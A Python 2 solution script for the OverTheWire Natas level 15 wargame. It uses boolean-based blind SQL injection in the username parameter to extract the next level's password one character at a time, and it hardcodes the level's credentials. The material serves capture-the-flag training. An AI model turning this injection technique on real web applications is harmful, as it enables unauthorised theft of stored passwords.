#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level15.py
  Solution for natas level15
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 15
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

def bruteforce_blind_injection():

   chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
   parsedChars = ''
   existMsg = 'This user exists.'
   flag = ''

   for c in chars:
       r = requests.get(host + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "', auth=(user, password))
       if r.content.find(existMsg) != -1:
           parsedChars += c

   for i in range(32):
       for c in chars:
           r = requests.get(host+'?username=natas16" AND password LIKE BINARY "' + flag + c + '%" "', auth=(user, password))
           if r.content.find(existMsg) != -1:
              flag += c
              print 'Flag: {0}\r'.format(flag + '*' * int(32 - len(flag))),
              sys.stdout.flush()
              break

   return flag

def get_flag():
    print("")
    return bruteforce_blind_injection()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
